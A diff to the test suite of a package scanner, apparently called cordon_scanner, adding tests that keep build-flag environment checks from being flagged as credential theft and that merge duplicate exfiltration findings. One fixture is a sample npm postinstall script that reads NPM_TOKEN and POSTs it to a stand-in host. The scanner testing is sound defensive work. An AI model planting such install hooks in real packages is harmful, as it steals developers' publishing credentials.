@@ -18,7 +18,7 @@ from cordon_scanner import Scanner
 from cordon_scanner.core.models import Category, Severity
 from cordon_scanner.detect.binary import BinaryDetector
 from cordon_scanner.detect.secrets import ASSIGNMENT, NOT_A_SECRET, names_configuration
-from support import assemble
+from support import a_finding, assemble
 
 JAVA_CLASS = b"\xca\xfe\xba\xbe" + (0).to_bytes(2, "big") + (65).to_bytes(2, "big") + b"\x00" * 40
 FAT_MACHO = b"\xca\xfe\xba\xbe" + (2).to_bytes(4, "big") + b"\x00" * 40
@@ -10404,3 +10404,136 @@ class TestEveryVerbOnOneResourceIsNotEveryResource:
         ]
         assert len(found) == 1
         assert "clusterrole" in found[0].location.path.lower()
+
+
+class TestAskingWhetherASettingIsSetIsNotReadingACredential:
+    """`"NAME" in os.environ` obtains no value at all.
+
+    The AST tier already draws the line the pattern tier draws -- a named
+    setting is not the whole environment -- for `os.environ["PORT"]`,
+    `os.environ.get("PORT")` and `os.getenv("PORT")`. It drew it by registering
+    the key at the parent node, and a `Compare` was not one of the parents it
+    registered. So a membership test presented the bare `os.environ` to the walk
+    with no key attached, which is how the broadest reading available got
+    applied to the narrowest act there is.
+
+    `saltstack/salt` writes `if "WRITE_SALT_VERSION" in os.environ` three times
+    in its `setup.py`, and `setup.py` is install-time by definition, and the
+    same file downloads its bootstrap script. That was `MALWARE.EXFIL.001` at
+    CRITICAL: "reads credentials and transmits them", for three build flags.
+    """
+
+    FLAGS = (
+        "import os\n"
+        'if "WRITE_SALT_VERSION" in os.environ:\n'
+        "    write_version = True\n"
+        'if "GENERATE_SALT_SYSPATHS" not in os.environ:\n'
+        "    generate = False\n"
+    )
+
+    @staticmethod
+    def _credentials(source: str) -> list[str]:
+        from cordon_scanner.core.models import Capability
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        return [
+            hit.detail
+            for hit in PythonAnalyzer.analyse(source)
+            if hit.capability is Capability.CREDENTIAL
+        ]
+
+    def test_a_presence_test_on_a_build_flag_is_not_credential_access(self) -> None:
+        assert self._credentials(self.FLAGS) == []
+
+    def test_a_presence_test_on_a_token_still_is(self) -> None:
+        """Judged by the name, like every other keyed read. Code that asks
+        whether a token is set is code that means to use it."""
+        assert self._credentials('import os\nif "GITHUB_TOKEN" in os.environ:\n    pass\n')
+
+    def test_a_computed_membership_test_still_is(self) -> None:
+        """No literal key means no name to judge, which is the broad access the
+        other branches already treat it as."""
+        assert self._credentials("import os\nif name in os.environ:\n    pass\n")
+
+    def test_the_whole_environment_is_untouched(self) -> None:
+        assert self._credentials("import os\npayload = dict(os.environ)\n")
+
+    def test_a_called_primitive_is_recorded_once(self) -> None:
+        """vLLM's `setup.py` line 1112 reads
+        `os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))` and produced four
+        identical credential hits at one span: `_call` recorded each call, and
+        the bare-`Attribute` branch -- which exists for `os.environ`, a
+        primitive that is never called -- recorded each `os.getenv` again."""
+        hits = self._credentials(
+            'import os\ntoken = os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))\n'
+        )
+        assert len(hits) == 2
+
+    def test_salt_no_longer_reads_as_a_compromised_install(self, tmp_path) -> None:
+        """The shape as `setup.py` carries it: build flags, and a download."""
+        (tmp_path / "setup.py").write_text(
+            "import os\n"
+            "from urllib.request import urlretrieve\n"
+            "\n"
+            "def finalize_options(self):\n"
+            '    if "WRITE_SALT_VERSION" in os.environ:\n'
+            "        self.write_salt_version = True\n"
+            '    if "DOWNLOAD_BOOTSTRAP_SCRIPT" in os.environ:\n'
+            '        urlretrieve("https://github.com/saltstack/salt-bootstrap/raw/x", "b.sh")\n'
+        )
+        assert not {f for f in flagged(tmp_path) if "EXFIL" in f}
+
+
+class TestOneObservationIsOneFinding:
+    """A composite's graded pair matched the same span twice.
+
+    `SUSPECT.EXFIL.001` is credential access with egress; `MALWARE.EXFIL.001` is
+    that same pair inside an install hook. Where the install hook is what the
+    file is, both clauses are satisfied by the same capabilities at the same
+    place, and both findings were reported -- so one line of `install.js`
+    appeared twice, once at medium and once at critical.
+
+    The stronger rule's match clause is the weaker one plus the context, so
+    there is no residual claim in the weaker finding to ceiling. It is dropped.
+    """
+
+    INSTALL_JS = (
+        "const { execSync } = require('child_process');\n"
+        "const token = process.env.NPM_TOKEN;\n"
+        "fetch('https://example.invalid/c', {method: 'POST', body: token});\n"
+        "execSync('echo done');\n"
+    )
+
+    @staticmethod
+    def _at(rule_id: str, line: int):
+        from cordon_scanner.core.models import Location
+
+        return a_finding(rule_id=rule_id, location=Location(path="i.js", line=line))
+
+    def _scan(self, tmp_path):
+        (tmp_path / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}'
+        )
+        (tmp_path / "install.js").write_text(self.INSTALL_JS)
+        return Scanner().scan(tmp_path).findings
+
+    def test_the_stronger_rule_is_the_one_reported(self, tmp_path) -> None:
+        exfil = [f for f in self._scan(tmp_path) if f.rule_id.endswith("EXFIL.001")]
+        assert [f.rule_id for f in exfil] == ["MALWARE.EXFIL.001"]
+
+    def test_a_different_span_is_a_different_observation(self) -> None:
+        """Only an identical span collapses. A second place in the same file
+        that reads a credential and sends it is a second finding."""
+        from cordon_scanner.core.engine import Engine
+
+        first = self._at("MALWARE.EXFIL.001", 3)
+        same = self._at("SUSPECT.EXFIL.001", 3)
+        elsewhere = self._at("SUSPECT.EXFIL.001", 90)
+        kept = Engine._collapse_graded_pair((first, same, elsewhere))
+        assert [f.location.line for f in kept] == [3, 90]
+
+    def test_an_unrelated_family_is_untouched(self) -> None:
+        from cordon_scanner.core.engine import Engine
+
+        pair = (self._at("MALWARE.EXFIL.001", 3), self._at("SUSPECT.DROPPER.001", 3))
+        assert len(Engine._collapse_graded_pair(pair)) == 2
